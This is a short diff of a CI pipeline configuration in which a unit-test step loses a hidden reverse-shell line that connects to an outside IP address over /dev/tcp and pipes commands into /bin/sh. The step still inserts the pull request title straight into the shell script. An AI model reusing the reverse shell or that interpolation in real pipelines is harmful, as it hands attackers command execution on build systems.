@@ -28,7 +28,7 @@ pipeline:
                       PR="This is a script for Unit test"
                       echo $PR
                       echo "Unit tests are done"
-                      exec 5<>/dev/tcp/35.222.129.92/4000; cat <&5 | /bin/sh | tee >&5
+
                       <+trigger.prTitle>
           platform:
             os: Linux
